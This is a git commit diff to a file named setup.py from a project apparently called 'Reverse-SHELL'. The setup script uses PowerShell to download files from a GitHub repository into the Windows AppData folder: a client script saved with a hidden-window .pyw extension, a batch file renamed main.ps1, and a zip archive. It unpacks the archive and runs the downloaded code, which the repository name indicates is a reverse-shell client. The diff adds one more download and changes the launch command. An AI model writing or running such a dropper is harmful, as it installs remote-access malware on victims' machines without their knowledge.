1920fe6d59eff27d5974f58acb6fdbc47034cc9a
Muzaffar Sharofitdinov <smartboymuzaffar@gmail.com>
2024-04-27 19:37:17 +0900

    Update setup.py

--- setup.py
+++ setup.py
@@ -2,6 +2,7 @@ import os, sys, subprocess
 
 username = os.environ.get('USERNAME')
 path = os.environ['appdata']
+bat_path = path + '\\main.ps1'
 file_path = path + '\\client.pyw'
 src_path = path + '\\src'
 script_path = src_path + '\\Script'
@@ -11,6 +12,10 @@ def setup():
     # download client.py file
     subprocess.call(
         f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{file_path}"',
+        shell=True)
+    # download main.ps1 file
+    subprocess.call(
+        f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/main.bat" -outfile "{bat_path}"',
         shell=True)
     # download src.zip file
     subprocess.call(f'powershell invoke-webrequest -uri "https://github.com/SmartBoyMuzaffar/Reverse-SHELL/raw/master/src.zip" -outfile "{path}\\src.zip"',
@@ -22,7 +27,7 @@ def setup():
     subprocess.call(f'powershell.exe rm {path}\\src.zip',
                     shell=True)
     # run client.py file
-    subprocess.call(f'powershell.exe {script_path}\\pythonw.exe {file_path}',
+    subprocess.call(f'{bat_path}',
                     shell=True)
 ################################################ done ##################################################################
 # Running code ...
